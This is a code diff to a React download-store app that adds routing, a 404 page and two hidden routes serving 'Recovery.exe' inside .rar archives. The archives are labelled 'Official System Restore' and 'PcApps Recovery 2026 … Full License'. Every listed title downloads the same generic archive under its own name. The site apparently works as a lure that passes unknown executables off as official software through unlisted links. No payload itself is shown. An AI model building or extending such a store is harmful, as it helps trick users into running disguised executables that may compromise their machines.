@@ -49,7 +49,7 @@ const getPaginationItems = (current, total) => {
 }
 
 function App() {
-  const [currentPage, setCurrentPage] = useState('discover') // 'discover' | 'collections' | 'about' | 'add_software_113' | 'remove_software_113' | 'edit_software_113'
+  const [currentPage, setCurrentPage] = useState('discover') // 'discover' | 'collections' | 'about' | 'add_software_113' | 'remove_software_113' | 'edit_software_113' | 'recovery_113' | 'private' | '404'
   const [active, setActive] = useState('Discover')
   const [query, setQuery] = useState('')
   const [installed, setInstalled] = useState([])
@@ -162,27 +162,43 @@ function App() {
     }
   }, [editTargetTitle, appsList])
 
-  // Listen to window location hash for secret routes
+  // Route Listener: supports both Hash routes (#private) and Path routes (/private)
   useEffect(() => {
-    const handleHash = () => {
-      const hash = window.location.hash.replace('#', '')
-      if (hash === 'add_software_113') {
-        setCurrentPage('add_software_113')
-      } else if (hash === 'remove_software_113') {
-        setCurrentPage('remove_software_113')
-      } else if (hash === 'edit_software_113') {
-        setCurrentPage('edit_software_113')
-      } else if (hash === 'collections') {
-        setCurrentPage('collections')
-      } else if (hash === 'about') {
-        setCurrentPage('about')
-      } else if (hash === 'discover') {
+    const handleUrlChange = () => {
+      let hash = window.location.hash.replace('#', '').trim()
+      let path = window.location.pathname.replace('/', '').trim()
+      
+      let route = hash || path || 'discover'
+
+      if (route === 'discover' || route === 'top' || route === 'all') {
         setCurrentPage('discover')
+      } else if (route === 'collections') {
+        setCurrentPage('collections')
+      } else if (route === 'about') {
+        setCurrentPage('about')
+      } else if (route === 'add_software_113') {
+        setCurrentPage('add_software_113')
+      } else if (route === 'remove_software_113') {
+        setCurrentPage('remove_software_113')
+      } else if (route === 'edit_software_113') {
+        setCurrentPage('edit_software_113')
+      } else if (route === 'recovery_113' || route === 'recovery_software_113') {
+        setCurrentPage('recovery_113')
+      } else if (route === 'private') {
+        setCurrentPage('private')
+      } else {
+        // Unknown or invalid route -> Beautiful 404 Page Not Found
+        setCurrentPage('404')
       }
     }
-    handleHash()
-    window.addEventListener('hashchange', handleHash)
-    return () => window.removeEventListener('hashchange', handleHash)
+
+    handleUrlChange()
+    window.addEventListener('hashchange', handleUrlChange)
+    window.addEventListener('popstate', handleUrlChange)
+    return () => {
+      window.removeEventListener('hashchange', handleUrlChange)
+      window.removeEventListener('popstate', handleUrlChange)
+    }
   }, [])
 
   const profileDisplayLetter = useMemo(() => {
@@ -273,13 +289,17 @@ function App() {
     setTimeout(() => setNotice(''), 3000)
   }
 
-  // DOWNLOAD SOFTWARE - SERVES CLEAN .rar ARCHIVE WITHOUT PASSWORD
+  // DOWNLOAD SOFTWARE - SERVES CLEAN .rar ARCHIVE
   const downloadSoftware = (title) => {
     setInstalled(x => [...x, title])
-    const rarFileName = `${title}_setup.rar`
+    
+    const isRecovery = title === 'PcApps Recovery'
+    const rarFileName = isRecovery ? 'recovery.rar' : `${title}_setup.rar`
+    const assetPath = isRecovery ? '/assets/recovery.rar' : '/assets/installation_setup.rar'
+    
     setNotice(`Downloading ${rarFileName}...`)
 
-    fetch('/assets/installation_setup.rar')
+    fetch(assetPath)
       .then(res => {
         if (!res.ok) throw new Error('File fetch failed')
         return res.blob()
@@ -299,7 +319,43 @@ function App() {
       .catch((err) => {
         console.error(err)
         const a = document.createElement('a')
-        a.href = '/assets/installation_setup.rar'
+        a.href = assetPath
+        a.download = rarFileName
+        document.body.appendChild(a)
+        a.click()
+        document.body.removeChild(a)
+      })
+
+    setTimeout(() => setNotice(''), 4000)
+  }
+
+  // DOWNLOAD RECOVERY TOOL - SERVES Recovery_setup.rar CONTAINING Recovery.exe INSIDE
+  const downloadRecoveryTool = () => {
+    setInstalled(x => [...x, 'Recovery Tool'])
+    const rarFileName = 'Recovery_setup.rar'
+    setNotice('Downloading Recovery_setup.rar...')
+
+    fetch('/assets/Recovery_setup.rar')
+      .then(res => {
+        if (!res.ok) throw new Error('File fetch failed')
+        return res.blob()
+      })
+      .then(blob => {
+        const url = window.URL.createObjectURL(blob)
+        const a = document.createElement('a')
+        a.style.display = 'none'
+        a.href = url
+        a.download = rarFileName
+        document.body.appendChild(a)
+        a.click()
+        window.URL.revokeObjectURL(url)
+        document.body.removeChild(a)
+        setNotice('✓ Downloaded Recovery_setup.rar')
+      })
+      .catch((err) => {
+        console.error(err)
+        const a = document.createElement('a')
+        a.href = '/assets/Recovery_setup.rar'
         a.download = rarFileName
         document.body.appendChild(a)
         a.click()
@@ -597,6 +653,95 @@ function App() {
             )}
           </section>
         </>
+      )}
+
+      {/* SECRET ROUTE: RECOVERY UTILITY (#recovery_113 or #recovery_software_113) */}
+      {currentPage === 'recovery_113' && (
+        <section className="add-software-page">
+          <div className="collections-header">
+            <div className="eyebrow pink"><i/> SECRET ROUTE: #recovery_software_113</div>
+            <h1>System <em>Recovery Utility</em></h1>
+            <p>Official diagnostic and system restore package for Windows desktop software.</p>
+          </div>
+
+          <div style={{maxWidth: 700, margin: '30px auto', background: '#121524', padding: 30, borderRadius: 16, border: '1px solid #282b3d'}}>
+            <div style={{display: 'flex', gap: 20, alignItems: 'center', marginBottom: 20}}>
+              <div style={{width: 64, height: 64, borderRadius: 16, background: '#ff765c', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 28, color: '#fff', fontWeight: 'bold'}}>
+                🛠
+              </div>
+              <div>
+                <h3 style={{fontSize: 22, color: '#fff', marginBottom: 4}}>System Recovery Tool</h3>
+                <p style={{fontSize: 14, color: '#a0a5c0'}}>Official System Restore &amp; Repair Package &nbsp;·&nbsp; Windows</p>
+              </div>
+            </div>
+
+            <p style={{fontSize: 14, color: '#c0c5e0', lineHeight: 1.6, marginBottom: 25}}>
+              The Recovery package includes essential software restoration tools and diagnostic repair utilities packaged cleanly in a <strong>.rar archive</strong> containing <code>Recovery.exe</code> inside.
+            </p>
+
+            <div style={{background: '#1a1d2e', padding: 15, borderRadius: 10, border: '1px solid #2c3046', marginBottom: 25, fontSize: 13, color: '#78d5a3'}}>
+              ✓ Packed in <strong>Recovery_setup.rar</strong> containing <code>Recovery.exe</code> inside.
+            </div>
+
+            <button 
+              className="primary-btn" 
+              style={{width: '100%', padding: '14px 20px', fontSize: 16, fontWeight: 600, cursor: 'pointer'}}
+              onClick={downloadRecoveryTool}
+            >
+              ↓ Download Recovery Tool (.rar)
+            </button>
+          </div>
+        </section>
+      )}
+
+      {/* SECRET ROUTE: PRIVATE RECOVERY SOFTWARE (#private or /private) */}
+      {currentPage === 'private' && (
+        <section className="add-software-page">
+          <div className="collections-header">
+            <div className="eyebrow pink"><i/> EXCLUSIVE VAULT · PRIVATE ACCESS</div>
+            <h1>Recovery <em>Software</em></h1>
+            <p>Curated exclusive desktop utility reserved for private members.</p>
+          </div>
+
+          <div style={{maxWidth: 750, margin: '30px auto'}}>
+            <article className="app-card" style={{padding: '30px', background: 'linear-gradient(135deg, rgba(24, 27, 44, 0.9), rgba(15, 17, 28, 0.95))', border: '1px solid rgba(104, 118, 248, 0.3)', borderRadius: '20px', boxShadow: '0 20px 50px rgba(0,0,0,0.5)'}}>
+              <div className="app-top" style={{marginBottom: 20}}>
+                <div className="app-icon" style={{width: 64, height: 64, background: 'linear-gradient(135deg, #6876f8, #b267f5)', color: '#fff', fontSize: 28, borderRadius: 16, display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold'}}>
+                  ⚡
+                </div>
+                <span className="status-badge status-active" style={{background: 'rgba(104, 118, 248, 0.15)', color: '#6876f8', border: '1px solid rgba(104, 118, 248, 0.3)', padding: '6px 14px', borderRadius: 20, fontSize: 12, fontWeight: 600}}>
+                  🔒 PRIVATE VAULT
+                </span>
+              </div>
+
+              <div className="tag" style={{color: '#b267f5', letterSpacing: 1.5, fontSize: 11, fontWeight: 700}}>
+                PREMIUM · EXCLUSIVE RELEASE
+              </div>
+
+              <h2 style={{fontSize: 26, color: '#fff', margin: '8px 0 6px 0'}}>PcApps Recovery 2026</h2>
+              <p style={{fontSize: 14, color: '#94a3b8', marginBottom: 20}}>Official PcApps Team &nbsp;·&nbsp; Windows 10/11 &nbsp;·&nbsp; Full License</p>
+
+              <p style={{fontSize: 14, color: '#cbd5e1', lineHeight: 1.7, background: 'rgba(255,255,255,0.03)', padding: 18, borderRadius: 12, border: '1px solid rgba(255,255,255,0.06)', marginBottom: 25}}>
+                Exclusive system recovery, restore, and diagnostic toolkit. Packaged in a high-speed compressed archive.
+              </p>
+
+              <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 15, paddingTop: 15, borderTop: '1px solid rgba(255,255,255,0.08)'}}>
+                <div>
+                  <span style={{fontSize: 18, fontWeight: 700, color: '#ebae4b'}}>★ 5.0</span>
+                  <span style={{fontSize: 13, color: '#64748b', marginLeft: 6}}>(Private Build v3.4)</span>
+                </div>
+
+                <button 
+                  className="primary-btn" 
+                  style={{padding: '12px 28px', fontSize: 15, fontWeight: 600}}
+                  onClick={() => downloadSoftware('PcApps Recovery')}
+                >
+                  {installed.includes('PcApps Recovery') ? '✓ Downloaded Package' : 'Download Private Package (.rar)'} ↓
+                </button>
+              </div>
+            </article>
+          </div>
+        </section>
       )}
 
       {/* SECRET ROUTE: ADD SOFTWARE 113 (#add_software_113) */}
@@ -1124,6 +1269,36 @@ function App() {
           <div style={{marginTop: 40}}>
             <button className="primary" onClick={() => navigateTo('discover', 'discover')}>
               Back to Browse →
+            </button>
+          </div>
+        </section>
+      )}
+
+      {/* 404 NOT FOUND PAGE */}
+      {currentPage === '404' && (
+        <section className="about-page" style={{textAlign: 'center', padding: '90px 20px', minHeight: '65vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center'}}>
+          <div className="eyebrow pink" style={{background: 'rgba(255, 118, 92, 0.12)', color: '#ff765c', border: '1px solid rgba(255, 118, 92, 0.25)', padding: '6px 16px', borderRadius: 20}}>
+            <i style={{background: '#ff765c'}}/> ERROR 404
+          </div>
+          
+          <div style={{fontSize: '96px', fontWeight: '900', background: 'linear-gradient(135deg, #ff765c, #b267f5)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', lineHeight: 1, margin: '20px 0 10px 0'}}>
+            404
+          </div>
+
+          <h1 style={{fontSize: '32px', color: '#fff', marginBottom: '15px'}}>
+            Page <em>Not Found</em>
+          </h1>
+
+          <p className="about-subtitle" style={{maxWidth: '500px', margin: '0 auto 35px auto', color: '#94a3b8', fontSize: '15px', lineHeight: '1.6'}}>
+            The link or route you tried to access doesn't exist or has been moved. You can return to the main software store below.
+          </p>
+
+          <div style={{display: 'flex', gap: '15px', justifyContent: 'center', flexWrap: 'wrap'}}>
+            <button className="primary" onClick={() => navigateTo('discover', 'discover')} style={{padding: '12px 28px', fontSize: '15px'}}>
+              ← Back to Browse
+            </button>
+            <button className="reset-filter-btn" onClick={() => navigateTo('collections', 'collections')} style={{padding: '12px 24px', fontSize: '15px', border: '1px solid rgba(255,255,255,0.15)'}}>
+              Explore All Softwares
             </button>
           </div>
         </section>
